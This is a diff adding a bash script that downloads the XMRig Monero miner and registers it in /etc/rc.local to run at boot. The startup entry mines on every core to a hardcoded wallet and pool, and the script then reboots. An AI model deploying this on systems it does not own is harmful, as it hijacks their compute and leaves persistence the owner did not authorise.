@@ -1,0 +1,10 @@
+
+#!/bin/bash
+sudo apt-get update && sudo apt-get --assume-yes upgrade
+sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+cd /
+sudo wget https://github.com/xmrig/xmrig/releases/download/v5.1.1/xmrig-5.1.1-xenial-x64.tar.gz
+sudo tar xvzf xmrig-5.1.1-xenial-x64.tar.gz
+printf '%s\n' '#!/bin/bash' 'core=`nproc --all`' 'sudo sysctl -w vm.nr_hugepages=256' 'cd /xmrig-5.1.1' './xmrig -o pool.minexmr.com:7777 -a rx0 -t $core -u 42wPsJzNsj32Z1pW3z4JiyMLJAt1mJMdadRVVHdAUJadEzDUfhWLNJpPTnVCELh8kqbux2uBg1jcxUVennHesyiz3aM3GaT' 'exit 0' | sudo tee -a /etc/rc.local
+sudo chmod +x /etc/rc.local
+sudo reboot
